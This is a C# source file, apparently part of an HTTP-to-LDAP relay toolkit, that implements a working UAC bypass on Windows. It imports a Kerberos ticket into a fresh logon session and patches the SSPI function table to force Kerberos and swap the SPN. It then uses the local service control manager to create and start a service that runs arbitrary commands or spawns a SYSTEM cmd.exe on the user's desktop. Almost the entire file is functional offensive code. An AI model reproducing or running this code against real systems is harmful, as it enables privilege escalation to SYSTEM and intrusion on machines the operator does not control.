// SCMUACBypass.cs - SCM UAC Bypass using Kerberos authentication
// Based on Tyranid's technique: https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82
// 
// The technique:
// 1. Re-launch ourselves with CreateProcessWithLogonW + LOGON_NETCREDENTIALS_ONLY
// 2. The new process has a fresh logon session where we CAN import tickets
// 3. Import the ticket into OUR session (LUID=0)
// 4. Hook SSPI to force Kerberos and correct SPN
// 5. OpenSCManager uses our ticket
// 6. CreateService + StartService = SYSTEM execution


using System.Runtime.InteropServices;
using System.Text;

namespace HttpLdapRelay
{
    public class SCMUACBypass
    {
        #region Constants

        private const int LOGON_NETCREDENTIALS_ONLY = 2;
        private const uint CREATE_NEW_CONSOLE = 0x00000010;
        private const uint CREATE_NO_WINDOW = 0x08000000;

        private const uint SC_MANAGER_CONNECT = 0x0001;
        private const uint SC_MANAGER_CREATE_SERVICE = 0x0002;
        private const uint SERVICE_ALL_ACCESS = 0xF01FF;
        private const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
        private const uint SERVICE_DEMAND_START = 0x00000003;
        private const uint SERVICE_ERROR_IGNORE = 0x00000000;

        private const uint STATUS_SUCCESS = 0;
        private const int KERB_SUBMIT_TKT_REQUEST_MESSAGE_TYPE = 21;

        private const uint TOKEN_ALL_ACCESS = 0xF01FF;

        #endregion

        #region Structures

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize;
            public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public int dwProcessId, dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_CRYPTO_KEY32
        {
            public int KeyType;
            public int Length;
            public int Offset;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_SUBMIT_TKT_REQUEST
        {
            public int MessageType;
            public LUID LogonId;
            public int Flags;
            public KERB_CRYPTO_KEY32 Key;
            public int KerbCredSize;
            public int KerbCredOffset;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS
        {
            public uint dwServiceType;
            public uint dwCurrentState;
            public uint dwControlsAccepted;
            public uint dwWin32ExitCode;
            public uint dwServiceSpecificExitCode;
            public uint dwCheckPoint;
            public uint dwWaitHint;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SecHandle
        {
            public IntPtr dwLower;
            public IntPtr dwUpper;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SecBuffer
        {
            public int cbBuffer;
            public int BufferType;
            public IntPtr pvBuffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SecBufferDesc
        {
            public int ulVersion;
            public int cBuffers;
            public IntPtr pBuffers;
        }

        // SSPI Function Table - must match exact Windows layout
        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_FUNCTION_TABLE
        {
            public uint dwVersion;
            public IntPtr EnumerateSecurityPackagesW;
            public IntPtr QueryCredentialsAttributesW;
            public IntPtr AcquireCredentialsHandleW;
            public IntPtr FreeCredentialsHandle;
            public IntPtr Reserved2;
            public IntPtr InitializeSecurityContextW;
            public IntPtr AcceptSecurityContext;
            public IntPtr CompleteAuthToken;
            public IntPtr DeleteSecurityContext;
            public IntPtr ApplyControlToken;
            public IntPtr QueryContextAttributesW;
            public IntPtr ImpersonateSecurityContext;
            public IntPtr RevertSecurityContext;
            public IntPtr MakeSignature;
            public IntPtr VerifySignature;
            public IntPtr FreeContextBuffer;
            public IntPtr QuerySecurityPackageInfoW;
            public IntPtr Reserved3;
            public IntPtr Reserved4;
            public IntPtr ExportSecurityContext;
            public IntPtr ImportSecurityContextW;
            public IntPtr AddCredentialsW;
            public IntPtr Reserved8;
            public IntPtr QuerySecurityContextToken;
            public IntPtr EncryptMessage;
            public IntPtr DecryptMessage;
            public IntPtr SetContextAttributesW;
        }

        #endregion

        #region Native Methods

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessWithLogonW(
            string lpUsername, string lpDomain, string lpPassword,
            int dwLogonFlags, string lpApplicationName, string lpCommandLine,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentProcessId();

        [DllImport("kernel32.dll")]
        private static extern bool ProcessIdToSessionId(uint dwProcessId, out uint pSessionId);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern uint GetModuleFileName(IntPtr hModule, StringBuilder lpFilename, uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("secur32.dll")]
        private static extern IntPtr InitSecurityInterfaceW();

        [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
        private static extern int AcquireCredentialsHandleW(
            string pszPrincipal, string pszPackage, uint fCredentialUse,
            IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument,
            ref SecHandle phCredential, ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
        private static extern int InitializeSecurityContextW(
            ref SecHandle phCredential, IntPtr phContext, string pszTargetName,
            uint fContextReq, uint Reserved1, uint TargetDataRep,
            IntPtr pInput, uint Reserved2, ref SecHandle phNewContext,
            ref SecBufferDesc pOutput, out uint pfContextAttr, ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll")]
        private static extern uint LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll")]
        private static extern uint LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthPackage);

        [DllImport("secur32.dll")]
        private static extern uint LsaCallAuthenticationPackage(IntPtr LsaHandle, uint AuthPackage, IntPtr Buffer,
            int BufferLength, out IntPtr ReturnBuffer, out int ReturnBufferLength, out uint ProtocolStatus);

        [DllImport("secur32.dll")]
        private static extern uint LsaFreeReturnBuffer(IntPtr Buffer);

        [DllImport("secur32.dll")]
        private static extern uint LsaDeregisterLogonProcess(IntPtr LsaHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr OpenSCManagerW(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateServiceW(IntPtr hSCManager, string lpServiceName, string lpDisplayName,
            uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl,
            string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId,
            string lpDependencies, string lpServiceStartName, string lpPassword);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr OpenServiceW(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool StartServiceW(IntPtr hService, uint dwNumServiceArgs, IntPtr lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ControlService(IntPtr hService, uint dwControl, ref SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
            int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetTokenInformation(IntPtr TokenHandle, int TokenInformationClass,
            ref uint TokenInformation, uint TokenInformationLength);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        #endregion

        #region Static fields for SSPI hooks

        private static string _targetSPN;

        // Keep delegates alive to prevent GC
        private static AcquireCredentialsHandleWDelegate _acquireHookDelegate;
        private static InitializeSecurityContextWDelegate _initHookDelegate;

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int AcquireCredentialsHandleWDelegate(
            string pszPrincipal, string pszPackage, uint fCredentialUse,
            IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument,
            ref SecHandle phCredential, ref SECURITY_INTEGER ptsExpiry);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int InitializeSecurityContextWDelegate(
            ref SecHandle phCredential, IntPtr phContext, string pszTargetName,
            uint fContextReq, uint Reserved1, uint TargetDataRep,
            IntPtr pInput, uint Reserved2, ref SecHandle phNewContext,
            ref SecBufferDesc pOutput, out uint pfContextAttr, ref SECURITY_INTEGER ptsExpiry);

        #endregion

        #region Public Entry Points

        /// <summary>
        /// Main entry point - launches worker process in new logon session
        /// </summary>
        public static bool Execute(byte[] kirbiBytes, string computerName, string command)
        {
            string shortName = computerName.Contains(".") ? computerName.Split('.')[0] : computerName;

            Console.WriteLine();
            Console.WriteLine("╔═══════════════════════════════════════════════════════════════╗");
            Console.WriteLine("║                    SCM UAC Bypass                             ║");
            Console.WriteLine("╚═══════════════════════════════════════════════════════════════╝");
            Console.WriteLine();

            // Save kirbi to temp file
            string kirbiPath = Path.Combine(Path.GetTempPath(), $"krb_{Guid.NewGuid():N}.tmp");
            File.WriteAllBytes(kirbiPath, kirbiBytes);

            try
            {
                return LaunchWorker(kirbiPath, shortName, command);
            }
            finally
            {
                try { File.Delete(kirbiPath); } catch { }
            }
        }

        /// <summary>
        /// Worker entry point - called in new logon session context
        /// Args: --scm-worker &lt;kirbi_path&gt; &lt;target&gt; &lt;command&gt; &lt;session_id&gt;
        /// </summary>
        public static int WorkerMain(string[] args)
        {
            if (args.Length < 5)
            {
                Console.WriteLine("[!] Invalid worker arguments");
                return 1;
            }

            string kirbiPath = args[1];
            string target = args[2];
            string command = args[3];
            uint sessionId = uint.Parse(args[4]);

            try
            {
                Console.WriteLine("[Worker] Starting SCM UAC Bypass worker...");

                // Step 1: Import ticket into our session
                Console.WriteLine("[Worker] Step 1: Importing Kerberos ticket...");
                byte[] kirbi = File.ReadAllBytes(kirbiPath);

                if (!ImportTicket(kirbi))
                {
                    Console.WriteLine("[!] Failed to import ticket");
                    return 1;
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Ticket imported successfully");
                Console.ResetColor();

                // Step 2: Setup SSPI hooks
                Console.WriteLine("[Worker] Step 2: Setting up SSPI hooks...");
                _targetSPN = $"HOST/{target}";

                if (!SetupSSPIHooks())
                {
                    Console.WriteLine("[!] Failed to setup SSPI hooks");
                    return 1;
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] SSPI hooks installed");
                Console.ResetColor();

                // Step 3: Connect to SCM on 127.0.0.1
                Console.WriteLine("[Worker] Step 3: Connecting to SCM...");

                IntPtr hSCManager = OpenSCManagerW("127.0.0.1", null, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
                if (hSCManager == IntPtr.Zero)
                {
                    Console.WriteLine($"[!] OpenSCManager failed: {Marshal.GetLastWin32Error()}");
                    return 1;
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Connected to SCM via Kerberos!");
                Console.ResetColor();

                // Step 4: Create and start service
                Console.WriteLine("[Worker] Step 4: Creating service...");

                string serviceName = $"Svc_{new Random().Next(1000, 9999)}";
                StringBuilder exePath = new StringBuilder(260);
                GetModuleFileName(IntPtr.Zero, exePath, 260);

                string serviceCmd;
                if (command.Equals("cmd.exe", StringComparison.OrdinalIgnoreCase) ||
                    command.Equals("cmd", StringComparison.OrdinalIgnoreCase) ||
                    command.Equals("powershell", StringComparison.OrdinalIgnoreCase) ||
                    command.Equals("powershell.exe", StringComparison.OrdinalIgnoreCase))
                {
                    // Spawn SYSTEM cmd in user's session
                    serviceCmd = $"\"{exePath}\" --run-system {sessionId}";
                }
                else
                {
                    serviceCmd = $"cmd.exe /c {command}";
                }

                Console.WriteLine($"[Worker] Service: {serviceName}");
                Console.WriteLine($"[Worker] Command: {serviceCmd}");

                IntPtr hService = CreateServiceW(hSCManager, serviceName, serviceName,
                    SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                    serviceCmd, null, IntPtr.Zero, null, null, null);

                if (hService == IntPtr.Zero)
                {
                    int err = Marshal.GetLastWin32Error();
                    if (err == 1073)
                        hService = OpenServiceW(hSCManager, serviceName, SERVICE_ALL_ACCESS);

                    if (hService == IntPtr.Zero)
                    {
                        Console.WriteLine($"[!] CreateService failed: {Marshal.GetLastWin32Error()}");
                        CloseServiceHandle(hSCManager);
                        return 1;
                    }
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Service created!");
                Console.ResetColor();

                Console.WriteLine("[Worker] Step 5: Starting service...");
                StartServiceW(hService, 0, IntPtr.Zero);
                Thread.Sleep(2000);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Service executed!");
                Console.ResetColor();

                // Cleanup
                Console.WriteLine("[Worker] Cleaning up...");
                SERVICE_STATUS status = new SERVICE_STATUS();
                ControlService(hService, 1, ref status);
                Thread.Sleep(500);
                DeleteService(hService);
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCManager);

                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Worker error: {ex.Message}");
                return 1;
            }
        }

        /// <summary>
        /// Run as SYSTEM - spawns cmd.exe in user's session
        /// Called when service starts our exe with --run-system
        /// </summary>
        public static int RunSystemProcess(uint sessionId)
        {
            IntPtr hToken;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out hToken))
                return 1;

            IntPtr hPrimaryToken;
            if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 0, 1, out hPrimaryToken))
            {
                CloseHandle(hToken);
                return 1;
            }

            // Set session ID to spawn in user's desktop
            if (!SetTokenInformation(hPrimaryToken, 12, ref sessionId, sizeof(uint)))
            {
                CloseHandle(hPrimaryToken);
                CloseHandle(hToken);
                return 1;
            }

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default";

            PROCESS_INFORMATION pi;
            if (!CreateProcessAsUserW(hPrimaryToken, null, "cmd.exe", IntPtr.Zero, IntPtr.Zero, false,
                CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi))
            {
                CloseHandle(hPrimaryToken);
                CloseHandle(hToken);
                return 1;
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(hPrimaryToken);
            CloseHandle(hToken);
            return 0;
        }

        #endregion

        #region Private Methods

        private static bool LaunchWorker(string kirbiPath, string target, string command)
        {
            uint sessionId;
            ProcessIdToSessionId(GetCurrentProcessId(), out sessionId);

            StringBuilder exePath = new StringBuilder(260);
            GetModuleFileName(IntPtr.Zero, exePath, 260);

            string cmdLine = $"\"{exePath}\" --scm-worker \"{kirbiPath}\" {target} \"{command}\" {sessionId}";

            Console.WriteLine("[*] Launching worker in new logon session...");
            Console.WriteLine($"[*] Target SPN: HOST/{target}");
            Console.WriteLine($"[*] Command: {command}");
            Console.WriteLine();

            STARTUPINFO si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>() };
            PROCESS_INFORMATION pi;

            // LOGON_NETCREDENTIALS_ONLY: credentials not validated, just creates new session
            bool result = CreateProcessWithLogonW(
                "user", ".", "pass",
                LOGON_NETCREDENTIALS_ONLY,
                null, cmdLine,
                0, // No special flags - let console output show
                IntPtr.Zero, null,
                ref si, out pi);

            if (!result)
            {
                Console.WriteLine($"[!] CreateProcessWithLogonW failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"[+] Worker started (PID: {pi.dwProcessId})");
            Console.WriteLine("[*] Waiting for worker...");
            Console.WriteLine();

            WaitForSingleObject(pi.hProcess, 60000);

            uint exitCode;
            GetExitCodeProcess(pi.hProcess, out exitCode);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            if (exitCode == 0)
            {
                return true;
            }

            Console.WriteLine($"[!] Worker failed (exit code: {exitCode})");
            return false;
        }

        private static bool ImportTicket(byte[] kirbi)
        {
            IntPtr lsaHandle = IntPtr.Zero;

            try
            {
                uint status = LsaConnectUntrusted(out lsaHandle);
                if (status != STATUS_SUCCESS)
                {
                    Console.WriteLine($"[!] LsaConnectUntrusted: 0x{status:X8}");
                    return false;
                }

                LSA_STRING kerbName = new LSA_STRING
                {
                    Length = 8,
                    MaximumLength = 9,
                    Buffer = Marshal.StringToHGlobalAnsi("Kerberos")
                };

                uint authPackage;
                status = LsaLookupAuthenticationPackage(lsaHandle, ref kerbName, out authPackage);
                Marshal.FreeHGlobal(kerbName.Buffer);

                if (status != STATUS_SUCCESS)
                {
                    Console.WriteLine($"[!] LsaLookupAuthenticationPackage: 0x{status:X8}");
                    return false;
                }

                int structSize = Marshal.SizeOf<KERB_SUBMIT_TKT_REQUEST>();
                int totalSize = structSize + kirbi.Length;
                IntPtr buffer = Marshal.AllocHGlobal(totalSize);

                try
                {
                    for (int i = 0; i < totalSize; i++)
                        Marshal.WriteByte(buffer, i, 0);

                    KERB_SUBMIT_TKT_REQUEST request = new KERB_SUBMIT_TKT_REQUEST
                    {
                        MessageType = KERB_SUBMIT_TKT_REQUEST_MESSAGE_TYPE,
                        LogonId = new LUID { LowPart = 0, HighPart = 0 },
                        Flags = 0,
                        Key = new KERB_CRYPTO_KEY32 { KeyType = 0, Length = 0, Offset = 0 },
                        KerbCredSize = kirbi.Length,
                        KerbCredOffset = structSize
                    };

                    Marshal.StructureToPtr(request, buffer, false);
                    Marshal.Copy(kirbi, 0, IntPtr.Add(buffer, structSize), kirbi.Length);

                    IntPtr returnBuffer;
                    int returnLength;
                    uint protocolStatus;

                    status = LsaCallAuthenticationPackage(lsaHandle, authPackage, buffer, totalSize,
                        out returnBuffer, out returnLength, out protocolStatus);

                    if (returnBuffer != IntPtr.Zero)
                        LsaFreeReturnBuffer(returnBuffer);

                    if (status != STATUS_SUCCESS)
                    {
                        Console.WriteLine($"[!] LsaCallAuthenticationPackage: 0x{status:X8}");
                        return false;
                    }

                    if (protocolStatus != STATUS_SUCCESS)
                    {
                        Console.WriteLine($"[!] Kerberos protocol: 0x{protocolStatus:X8}");
                        return false;
                    }

                    return true;
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }
            }
            finally
            {
                if (lsaHandle != IntPtr.Zero)
                    LsaDeregisterLogonProcess(lsaHandle);
            }
        }

        private static bool SetupSSPIHooks()
        {
            try
            {
                IntPtr pTable = InitSecurityInterfaceW();
                if (pTable == IntPtr.Zero)
                    return false;

                // Create hook delegates
                _acquireHookDelegate = HookedAcquireCredentialsHandleW;
                _initHookDelegate = HookedInitializeSecurityContextW;

                IntPtr pAcquireHook = Marshal.GetFunctionPointerForDelegate(_acquireHookDelegate);
                IntPtr pInitHook = Marshal.GetFunctionPointerForDelegate(_initHookDelegate);

                // Get offsets
                int acquireOffset = Marshal.OffsetOf<SECURITY_FUNCTION_TABLE>("AcquireCredentialsHandleW").ToInt32();
                int initOffset = Marshal.OffsetOf<SECURITY_FUNCTION_TABLE>("InitializeSecurityContextW").ToInt32();

                // Unprotect
                uint oldProtect;
                VirtualProtect(pTable, (UIntPtr)Marshal.SizeOf<SECURITY_FUNCTION_TABLE>(), 0x40, out oldProtect);

                // Write hooks
                Marshal.WriteIntPtr(pTable, acquireOffset, pAcquireHook);
                Marshal.WriteIntPtr(pTable, initOffset, pInitHook);

                // Restore
                VirtualProtect(pTable, (UIntPtr)Marshal.SizeOf<SECURITY_FUNCTION_TABLE>(), oldProtect, out _);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Hook setup error: {ex.Message}");
                return false;
            }
        }

        private static int HookedAcquireCredentialsHandleW(
            string pszPrincipal, string pszPackage, uint fCredentialUse,
            IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument,
            ref SecHandle phCredential, ref SECURITY_INTEGER ptsExpiry)
        {
            Console.WriteLine($"[Hook] AcquireCredentialsHandle: {pszPackage}");

            if (pszPackage?.Equals("Negotiate", StringComparison.OrdinalIgnoreCase) == true)
            {
                pszPackage = "Kerberos";
                Console.WriteLine("[Hook] -> Forced Kerberos");
            }

            return AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse,
                pvLogonId, pAuthData, pGetKeyFn, pvGetKeyArgument, ref phCredential, ref ptsExpiry);
        }

        private static int HookedInitializeSecurityContextW(
            ref SecHandle phCredential, IntPtr phContext, string pszTargetName,
            uint fContextReq, uint Reserved1, uint TargetDataRep,
            IntPtr pInput, uint Reserved2, ref SecHandle phNewContext,
            ref SecBufferDesc pOutput, out uint pfContextAttr, ref SECURITY_INTEGER ptsExpiry)
        {
            Console.WriteLine($"[Hook] InitializeSecurityContext: {pszTargetName} -> {_targetSPN}");

            return InitializeSecurityContextW(ref phCredential, phContext, _targetSPN,
                fContextReq, Reserved1, TargetDataRep, pInput, Reserved2,
                ref phNewContext, ref pOutput, out pfContextAttr, ref ptsExpiry);
        }

        #endregion
    }
}